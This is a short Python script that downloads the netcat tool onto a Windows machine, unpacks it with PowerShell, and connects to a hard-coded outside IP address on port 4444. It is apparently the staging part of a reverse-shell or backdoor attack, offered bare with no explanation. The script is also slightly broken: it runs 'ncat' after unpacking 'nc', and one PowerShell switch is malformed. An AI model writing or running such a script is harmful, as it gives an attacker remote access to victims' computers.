import subprocess
import time
import os
os.system("curl -L -o nc.zip https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip")
os.system("powershell -NoProfile Command Expand-Archive -Force nc.zip nc")   
time.sleep(1)
os.system("ncat 13.48.45.196 4444")
